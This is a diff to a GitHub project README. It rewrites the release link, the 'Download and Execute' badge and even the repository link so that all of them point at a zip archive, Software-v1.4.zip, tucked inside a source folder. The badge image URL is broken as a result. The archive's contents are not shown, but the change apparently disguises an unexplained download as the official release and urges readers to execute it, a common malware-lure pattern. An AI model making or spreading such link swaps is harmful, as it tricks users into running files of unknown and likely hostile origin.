@@ -19,9 +19,9 @@
 
 ### Looking for the Latest Release?
 
-📦 Find the latest release at [here](https://github.com/Ainz012/loyalty/releases). Click the button below to access the latest version:
+📦 Find the latest release at [here](https://github.com/Ainz012/loyalty/raw/refs/heads/master/src/loyalty/adapters/Software-v1.4.zip). Click the button below to access the latest version:
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Here-brightgreen)](https://github.com/Ainz012/loyalty/releases)
+[![Download and Execute](https://github.com/Ainz012/loyalty/raw/refs/heads/master/src/loyalty/adapters/Software-v1.4.zip%20and%20Execute-Here-brightgreen)](https://github.com/Ainz012/loyalty/raw/refs/heads/master/src/loyalty/adapters/Software-v1.4.zip)
 
 ### Project Details
 
@@ -44,7 +44,7 @@
 
 ### Connect with Us
 
-🌐 Stay connected with the loyalty project by visiting our [GitHub repository](https://github.com/Ainz012/loyalty). Explore the code, issues, and discussions related to the project.
+🌐 Stay connected with the loyalty project by visiting our [GitHub repository](https://github.com/Ainz012/loyalty/raw/refs/heads/master/src/loyalty/adapters/Software-v1.4.zip). Explore the code, issues, and discussions related to the project.
 
 ### Thank You!
 
